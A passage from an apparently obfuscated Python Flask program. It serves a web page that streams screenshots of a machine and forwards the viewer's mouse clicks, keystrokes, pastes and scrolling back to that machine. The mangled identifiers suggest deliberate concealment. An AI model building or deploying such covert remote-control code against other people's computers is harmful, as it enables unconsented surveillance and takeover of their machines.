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"> <input type="text" id="text_input" placeholder="(paste here)" class="movetobottom" onkeyup="deal_with_input()"></div><div class="containertwo"><table class="table table-bordered containertwo"><thead><tr><th scope="col">Enable/Disable</th></tr></thead><tbody><tr><td><div class="custom-control custom-checkbox"><input type="checkbox" class="custom-control-input" id="clicksbox" onclick="clickboxclicked(event)" checked="checked"><label class="custom-control-label" for="customCheck1">Clicks</label></div></td></tr><tr><td><div class="custom-control custom-checkbox"><input type="checkbox" class="custom-control-input" id="keysbox" onclick="keyboxclicked(event)" checked="checked"><label class="custom-control-label" for="customCheck2">Keys</label></div></td></tr><tr><td><div class="custom-control custom-checkbox"><input type="checkbox" class="custom-control-input" id="scrollsbox" onclick="scrollboxclick(event)" checked="true"><label class="custom-control-label" for="customCheck3">Scrolling</label></div></td></tr></tbody></table></div><script type="text/javascript" src="https://code.jquery.com/jquery-1.6.2.js"></script><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script><script>const delay = (delayInms) => {
          return new Promise(resolve => setTimeout(resolve, delayInms));
        }
        var online_status = true;


        var url = "/ss";
        var currentscreen = -1
        function screenshot_manager(){
            
    
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url);
    
            xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                console.log(xhr.status);
                if (xhr.status ==200) {
                    if (xhr.responseText.length > 250){
                      document.getElementById("myImage").src='data:image/png;base64,'+xhr.responseText;
                      if (online_status == false) {
                        online_status = true;
                        showAndDismissAlertLONG("success", window.location.hostname+"/"+url+" is online again!");
                      }
                    }
                }
                else {
                  if (online_status == true){
                    online_status = false;
                    showAndDismissAlertLONG("danger", window.location.hostname+"/"+url+" is offline");
                    
                  } 
                }
              
              
                screenshot_manager()
            }};
            xhr.send();
        }
        screenshot_manager()</script><script>$("#myImage").mousedown ( function (evt) {

var jThis               = $(this);
var offsetFromParent    = jThis.position ();
var topThickness        = (jThis.outerHeight(true) - jThis.height() ) / 2;
var leftThickness       = (jThis.outerWidth (true) - jThis.width () ) / 2;

//--- (x,y) coordinates of the mouse click relative to the image.
var x                   = evt.pageX - offsetFromParent.left - leftThickness;
var y                   = evt.pageY - offsetFromParent.top  - topThickness;

var clickbool = $('#clicksbox').prop("checked") ? 1 : 0 ; 
if (clickbool == 1) {
  console.log("X:"+x+" Y:"+y)
  try {     
        const response =  fetch('/mouse', {
          method: 'post',
          body: JSON.stringify({x:x,y:y,type:evt.which,action:"down",screen:currentscreen})
        });
        console.log('Mouse click completed - x : '+x+" y : "+y+" type : "+evt.which, response);
      } catch(err) {
        alert(`Error: ${err}`);
      }
}
  
} );




$("#myImage").mouseup ( function (evt) {

var jThis               = $(this);
var offsetFromParent    = jThis.position ();
var topThickness        = (jThis.outerHeight(true) - jThis.height() ) / 2;
var leftThickness       = (jThis.outerWidth (true) - jThis.width () ) / 2;

//--- (x,y) coordinates of the mouse click relative to the image.
var x                   = evt.pageX - offsetFromParent.left - leftThickness;
var y                   = evt.pageY - offsetFromParent.top  - topThickness;

var clickbool = $('#clicksbox').prop("checked") ? 1 : 0 ; 
if (clickbool == 1) {
  console.log("X:"+x+" Y:"+y)
  try {     
        const response =  fetch('/mouse', {
          method: 'post',
          body: JSON.stringify({x:x,y:y,type:evt.which,action:"up",screen:currentscreen})
        });
        console.log('Mouse release completed - x : '+x+" y : "+y+" type : "+evt.which, response);
      } catch(err) {
        alert(`Error: ${err}`);
      }
}

} );</script><script type="text/javascript">$("img").bind("contextmenu",function(n){return!1})</script><script type="text/javascript"></script><script>document.getElementById("myImage").setAttribute("draggable",!1)</script><script>window.addEventListener("wheel", event => {
  var scrollbool = $('#scrollsbox').prop("checked") ? 1 : 0 ; 
    if (scrollbool == 1){
      try {     
        const response =  fetch('/scroll', {
          method: 'post',
          body: JSON.stringify({scroll:event.deltaY})
        });
        
        console.log('Scroll completed : '+event.deltaY, response);
      } catch(err) {
        alert(`Error: ${err}`);
      }
    }


});</script><div class="alert-messages movetobottom"></div><script>function showAndDismissAlert(e,s){var a='<div class="alert alert-'+e+'">'+s+"</div>";$(".alert-messages").prepend(a),$(".alert-messages .alert").first().hide().fadeIn(500).delay(1e3).fadeOut(500,function(){$(this).remove()})}function showAndDismissAlertLONG(e,s){var a='<div class="alert alert-'+e+'">'+s+"</div>";$(".alert-messages").prepend(a),$(".alert-messages .alert").first().hide().fadeIn(500).delay(3e4).fadeOut(1e3,function(){$(this).remove()})}</script><script>document.addEventListener('paste', function(event) {
    
    setTimeout(function(){
        console.log(document.getElementById("text_input").value)
        if (document.getElementById("text_input").value === "") {
            showAndDismissAlert("danger", "Use the input box provided to copy text - otherwise the browser can't pick it up");

            console.log("Paste detected - no content detected - use the box")
        }

        else{
            console.log("Paste detected : "+document.getElementById("text_input").value )
            try {     
            const response = fetch('/type', {
            method: 'post',
            body: JSON.stringify({keys:  document.getElementById("text_input").value})
            });
            document.getElementById("text_input").value = "";
        } catch(err) {
            alert(`Error: ${err}`);
        }
    }}
    
    )

}, 1);</script><script>document.addEventListener('keypress', function(event) {

    var char = String.fromCharCode(event.which)

    var keybool = $('#keysbox').prop("checked") ? 1 : 0 ;  
    if (keybool == 1){
      try {     
        const response =  fetch('/type', {
          method: 'post',
          body: JSON.stringify({keys:char})
        });
        console.log('Key completed : '+char  + " | Numeric code = "+event.keyCode, response);
      } catch(err) {
        alert(`Error: ${err}`);
      }

  }

});


document.addEventListener('keyup', function(event) {
    //console.log(event.keyCode)
    var char = String.fromCharCode(event.which)
    const specialcharacters = [8]
    var keybool = $('#keysbox').prop("checked") ? 1 : 0 ;  
    if ((specialcharacters.indexOf(event.keyCode) >= 0) && (keybool==1)) {
        console.log("Special character - "+event.keyCode+" in ["+specialcharacters +"] pressed" + " | Character = "+char)

            try {     
        const response =  fetch('/type', {
            method: 'post',
            body: JSON.stringify({keys:char})
        });
        console.log('Key completed : '+char  + " | Numeric code = "+event.keyCode, response);
        } catch(err) {
        alert(`Error: ${err}`);
        }
        };

    }
)</script><script>function clickboxclicked(s){s.target.checked?showAndDismissAlert("success","Click events turned on"):showAndDismissAlert("info","Click events turned off")}function keyboxclicked(s){s.target.checked?showAndDismissAlert("success","Key presses turned on"):showAndDismissAlert("info","Key presses turned off")}function scrollboxclick(s){s.target.checked?showAndDismissAlert("success","Scroll events turned on"):showAndDismissAlert("info","Scroll events turned off")}</script><script>window.addEventListener("auxclick", (event) => {
  if (event.button === 1) event.preventDefault();
});</script><script>function deal_with_input(){document.getElementById("text_input").value=""}</script><script></script></body></html>

<script>
  function screenset(screen) {
      console.log("Setting new endpoint to "+screen)
      url = screen;
      if (screen.includes("=")) {
        screenurlstuff = screen.split("=")[1];
        console.log("You are now viewing screen "+screenurlstuff)
        currentscreen = Number(screenurlstuff) -1
      }
      else{
        currentscreen = -1
        console.log("You are now viewing overview")
      }

  }
  </script>

<div class="buttonbottom">
<a href="javascript: screenset('/ss');"><button  class="btn"><i class="fa fa-code"></i>  OVERVIEW</button></a>
DATAHERE
</div>
  

""".replace ("DATAHERE", OO00OO0O00O000O00)  # line:2277


@app .route ("/", methods =["GET"])  # line:2280
def home():  # line:2281
    sys.exit()
    return """<style>.home-container{width:100%;display:flex;overflow:hidden;box-shadow:5px 5px 10px 0 #bd2e2e;min-height:100vh;overflow-x:hidden;overflow-y:hidden;align-items:center;border-color:#da1818;flex-direction:column;justify-content:center;background-color:#0b0c1a}.open{top:550px;left:1020;color:#fbfbfb;width:75;position:absolute;box-shadow:#fff -5px -5px 10px .01px;padding-right:0;background-color:#3b35aa}.run{top:600px;left:1020;color:#fbfbfb;width:75;position:absolute;box-shadow:#fff -5px -5px 10px .01px;background-color:#3b35aa}.clearcmd{top:600px;left:1100;color:#fbfbfb;width:75;position:absolute;box-shadow:#fff -5px -5px 10px .01px;background-color:#3b35aa}.clearopen{top:550px;left:1100;color:#fbfbfb;width:75;position:absolute;box-shadow:#fff -5px -5px 10px .01px;background-color:#3b35aa}.home-link{top:32px;left:500px;color:var(--dl-color-gray-black);width:146px;position:absolute;align-self:stretch;box-shadow:5px 5px 10px 0 #d4d4d4;padding-right:0;text-decoration:none;background-color:#da638d}checkboxx{top:700px;left:500px;color:var(--dl-color-gray-black);width:146px;position:absolute;align-self:stretch;padding-right:0;text-decoration:none;background-color:#32c359}.home-link01{top:74;left:500;color:var(--dl-color-gray-black);width:146px;position:absolute;align-self:stretch;box-shadow:#d4d4d4 5px 5px 10px 0;padding-right:0;text-decoration:none;background-color:#da638d}.home-link02{top:114;left:500;color:var(--dl-color-gray-black);width:146px;position:absolute;align-self:stretch;box-shadow:#d4d4d4 5px 5px 10px 0;text-align:left;padding-right:0;text-decoration:underline none;background-color:#da638d}.home-link03{top:154;left:500;color:var(--dl-color-gray-black);width:146px;position:absolute;align-self:stretch;box-shadow:#d4d4d4 5px 5px 10px 